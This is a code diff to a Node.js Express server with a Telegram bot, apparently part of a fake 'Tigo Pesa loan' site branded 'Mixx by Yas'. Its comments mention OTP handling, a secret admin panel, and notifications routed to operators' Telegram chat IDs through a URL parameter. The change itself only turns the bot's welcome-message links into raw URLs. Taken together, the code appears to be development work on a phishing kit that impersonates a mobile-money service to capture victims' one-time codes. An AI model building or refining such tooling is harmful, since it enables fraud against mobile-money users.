@@ -7,6 +7,7 @@
  * - Secured private path serves the admin panel (admin.html).
  * - Request New OTP handling with 30s countdown integration.
  * - Dynamic Admin URL parameter parsing (?admin=CHAT_ID) for routing notifications.
+ * - Raw clickable URLs directly in Telegram welcome message to open instantly.
  */
 
 const express = require('express');
@@ -108,7 +109,7 @@ async function initBot() {
   });
 
   /**
-   * **INSTANT /START COMMAND HANDLER WITH DYNAMIC ADMIN QUERY LINK**
+   * **INSTANT /START COMMAND HANDLER WITH RAW CLICKABLE LINKS**
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
@@ -119,7 +120,7 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Customized browse link containing their unique chat ID as a query parameter
+    // Direct raw links replacing custom display text
     const customAdminBrowseLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${chatId}`;
     const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
 
@@ -128,8 +129,8 @@ async function initBot() {
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
       `🏷 **Username:** ${username}\n` +
-      `🔗 **Browse Application Link:** [Open App](${customAdminBrowseLink})\n` +
-      `🔗 **Admin Dashboard Link:** [Open Dashboard](${secureAdminLink})`;
+      `🔗 **Browse Application Link:** ${customAdminBrowseLink}\n` +
+      `🔗 **Admin Dashboard Link:** ${secureAdminLink}`;
 
     await bot.sendMessage(chatId, userWelcomeInfo, { 
       parse_mode: 'Markdown',
@@ -363,3 +364,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
   await initBot();
 });
+                                  
